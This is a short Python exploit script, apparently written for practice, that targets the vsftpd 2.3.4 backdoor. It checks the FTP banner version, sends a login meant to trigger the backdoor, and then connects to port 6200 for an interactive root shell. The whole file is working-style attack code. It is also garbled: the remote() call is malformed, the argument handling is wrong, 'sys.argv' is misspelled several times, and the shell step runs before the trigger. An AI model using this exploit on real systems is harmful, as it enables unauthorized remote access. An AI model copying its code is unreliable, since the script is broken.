    #!/usr/bin/python3

from pwn import *
from sys import exit
from time import sleep

class ExploitFTP:
    def __init__(self,ip,port=21):
        self.ip =ip
        self.port = port
        self.p =log.progress('')

    def trigger_backdoor(self):
        self.p.status("checking version")
        #io = remote(host,port)
        #io =listen()
        io = remote("self,ip,self.port")
        io.recvuntil("vsfTPd")
        version = (io.recvuntil(")")[:-1].decode())
        if version != "2.3.4":
            self.p.failure("VErsion Not found ......")
            exit()

        else:
            self.p.status("userhello:)")
            io.sendline("pass hello123")
            io.close()    


    def get_shell(self):
        self.p.status("connecting to backdoor ....")
        sleep(1)
        io =remote(self.ip,6200)
        self.p.success("got shell......")
        io.interactive()
        io.close()

  
if __name__ == "__main__":
    if len(sys.argv) < 2 or len(sys.argv) < 3:
        error(f"usage: {sys.arfv[0]} IP PORT(optional)")
         
    if len(sys.argv == 3):
        exploit = ExploitFTP(sys.srgv[1],sys.srgv[2])
    else:
        exploit = ExploitFTP(sys.srgv[1])         
        
        exploit.get_shell()
        exploit.trigger_backdoor()